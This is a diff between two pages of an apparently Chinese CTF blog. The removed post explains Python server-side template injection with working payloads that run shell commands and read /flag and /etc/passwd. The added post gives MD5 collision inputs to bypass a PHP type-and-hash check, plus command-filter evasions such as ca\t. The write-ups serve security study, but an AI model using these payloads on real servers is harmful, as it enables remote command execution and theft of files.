@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="从一道题目浅谈SSTi, Keep-Boom">
+    <meta name="keywords" content="同时绕过强制类型和MD5, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>从一道题目浅谈SSTi | Keep-Boom</title>
+    <title>同时绕过强制类型和MD5 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">从一道题目浅谈SSTi</h1>
+                    <h1 class="description center-align post-title">同时绕过强制类型和MD5</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-03-19
+                    2021-03-23
                 </div>
                 
 
@@ -459,87 +459,19 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="什么是模板-amp-模板注入SSTI-server-side-template-injection"><a href="#什么是模板-amp-模板注入SSTI-server-side-template-injection" class="headerlink" title="什么是模板&amp;模板注入SSTI(server-side template injection)"></a>什么是模板&amp;模板注入SSTI(server-side template injection)</h3><p>小学的时候拿别人的好词好句，套在我们自己的作文里，此时我们的作文就相当于模板，而别人的好词好句就相当于传递进模板的内容。</p>
-<h3 id="Python-SSTI知识点"><a href="#Python-SSTI知识点" class="headerlink" title="Python SSTI知识点"></a>Python SSTI知识点</h3><p>在Python的ssti中，大部分是依靠基类-&gt;子类-&gt;危险函数的方式来利用ssti，接下来讲几个知识点。</p>
-<ul>
-<li><p><code>__class__</code></p>
-<p>万物皆对象，而<strong>class</strong>用于返回该对象所属的类，比如某个字符串，他的对象为字符串对象，而其所属的类为<code>&lt;class &#39;str&#39;&gt;</code>。</p>
-</li>
-<li><p><code>__bases__</code></p>
-<p>以元组的形式返回一个类所直接继承的类。</p>
-</li>
-<li><p><code>__base__</code></p>
-<p>以字符串返回一个类所直接继承的类。</p>
-</li>
-<li><p><code>__mro__</code></p>
-<p>返回解析方法调用的顺序。</p>
-</li>
-<li><p><code>__subclasses__()</code></p>
-</li>
-</ul>
-<p>​       获取类的所有子类。</p>
-<ul>
-<li><p><strong><code>__init__</code></strong></p>
-<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>
-</li>
-<li><p><strong><code>__globals__</code></strong></p>
-<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>
-<p><strong><code>__builtins__</code></strong></p>
-<p><strong>在pyton2中为 <code>__builtins__</code> 和 <code>__builtin__</code></strong></p>
-<p>这里 <code>__builtins__</code> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p>
-<p>而 <code>__builtins__</code> 实际上是一个指向或者说引用 <code>__builtin__</code> 的（有点类似于软链接），而真正BIF在被定义时是在 <code>__builtin__</code> 模块中进行的。</p>
-<p><strong>在python3中为 <code>__builtins__</code> 和 <code>builtins</code></strong></p>
-<p>这里只不过 <code>builtins</code> 代替的 <code>__builtin__</code></p>
-<p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 <code>dir(__builtins__)</code> 可以查到。</p>
-<p><img src="/images/40.png"></p>
-</li>
-</ul>
-<h3 id="查询都哪些子类调用了-builtins-每个版本的python，子类不一样"><a href="#查询都哪些子类调用了-builtins-每个版本的python，子类不一样" class="headerlink" title="查询都哪些子类调用了__builtins__(每个版本的python，子类不一样)"></a>查询都哪些子类调用了<code>__builtins__</code>(每个版本的python，子类不一样)</h3><pre class=" language-python"><code class="language-python">search <span class="token operator">=</span> <span class="token string">'__builtins__'</span>   
-num <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    num <span class="token operator">+=</span> <span class="token number">1</span>
-    <span class="token keyword">try</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> search <span class="token keyword">in</span> i<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> num<span class="token punctuation">)</span>
-    <span class="token keyword">except</span><span class="token punctuation">:</span>
-        <span class="token keyword">pass</span></code></pre>
-<p>在SSTI中，我们要做的无非就两个：</p>
-<ul>
-<li>执行命令</li>
-<li>获取文件内容</li>
-</ul>
-<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><p>直接回车搜索出现参数name</p>
-<p><img src="/images/34.png"></p>
-<p>输入1，回显出1。猜测是模板注入。</p>
-<pre><code>payload=&#123;&#123;6*6&#125;&#125;   回显36，存在模板注入。</code></pre>
-<p><img src="/images/35.png"></p>
-<p>注入思路，虽然当前的类底下可能没有可以执行命令的方法，但可以找到它的基类下的其他子类，进行命令执行。</p>
-<pre><code>payload=&#123;&#123;''.__class__&#125;&#125;</code></pre>
-<p>回显对象所对应的类，这里是字符型。当然前面的‘’可以换成其他的，像（），[]等。</p>
-<p><img src="/images/36.png"></p>
-<p>下一步找到类所对应的基类object</p>
-<pre><code>payload=&#123;&#123;''.__class__.__mro__&#125;&#125;  注：除了mro 还可以使用base 和 bases</code></pre>
-<p><img src="/images/37.png"></p>
-<p>下一步找到其底下的所有子类</p>
-<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()&#125;&#125;</code></pre>
-<p><img src="/images/38.png"></p>
-<p>接下来就是找能执行命令或者可以读取文件的类就可以了，重点关注os/file这些关键字。例如file类和os._wrap_close类</p>
-<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('ls /').read()&#125;&#125;</code></pre>
-<p><img src="/images/39.png"></p>
-<p>最后cat下就行</p>
-<pre><code>payload=&#123;&#123;''.__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
-<h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><p>#threading.Semaphore</p>
-<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('/flag').read()&#125;&#125;</code></pre>
-<p>#os._wrap_close</p>
-<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[117].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;</code></pre>
-<p>#warnings.catch_warnings</p>
-<pre><code>&#123;&#123;''.__class__.__mro__[1].__subclasses__()[169].__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre>
-<p>#file</p>
-<pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()&#125;&#125;
-&#123;&#123;().__class__.__bases__[0].__subclasses__()[40]('/tmp/..','w').write()&#125;&#125;</code></pre>
-<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-1">https://xz.aliyun.com/t/6885#toc-1</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226900">https://www.anquanke.com/post/id/226900</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google">https://blog.csdn.net/TM_1024/article/details/107237455?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161614309216780265430236%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161614309216780265430236&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-107237455.pc_search_result_before_js&amp;utm_term=BJDCTF+2nd%5Dfake+google</a></p>
+                <h3 id="安洵杯-2019-web题-easy-web"><a href="#安洵杯-2019-web题-easy-web" class="headerlink" title="[安洵杯 2019] web题-easy_web"></a>[安洵杯 2019] web题-easy_web</h3><p>知识点：</p>
+<p>MD5强绕过</p>
+<p>shell的绕过方式</p>
+<pre><code>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
+
+b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre>
+<pre><code>if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;
+        echo `$cmd`;
+    &#125;     “`”表示执行shell命令</code></pre>
+<p>数组可以绕过MD5，但绕不过前面的强制类型转换，上面的方法是大佬想出来的，没看懂为啥。。。</p>
+<p>#过滤了ls 但可以用dir</p>
+<p>#过滤了cat 可以使用 ca\t 绕过或者 sort /flag</p>
+<p>在shell命令里可以加\不影响执行</p>
 
             </div>
             <hr/>
@@ -565,7 +497,7 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">http://example.com/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/</a>
+                    <a href="http://example.com/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/">http://example.com/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -770,9 +702,10 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/03/23/%E5%90%8C%E6%97%B6%E7%BB%95%E8%BF%87%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E5%92%8CMD5/">
                     <div class="card-image">
@@ -790,9 +723,9 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -801,6 +734,7 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -811,13 +745,13 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/18/%E4%BB%8E%E4%B8%80%E6%AC%A1%E5%81%9A%E9%A2%98%E6%B5%85%E6%9E%90%E5%8F%8D%E5%BC%B9shell/">
+                <a href="/2021/03/19/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E6%B5%85%E8%B0%88SSTi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="从一次做题浅析反弹shell">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="从一道题目浅谈SSTi">
                         
-                        <span class="card-title">从一次做题浅析反弹shell</span>
+                        <span class="card-title">从一道题目浅谈SSTi</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -828,7 +762,7 @@ num <span class="token operator">=</span> <span class="token operator">-</span><
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-18
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-19
                             </span>
                         <span class="publish-author">
                             
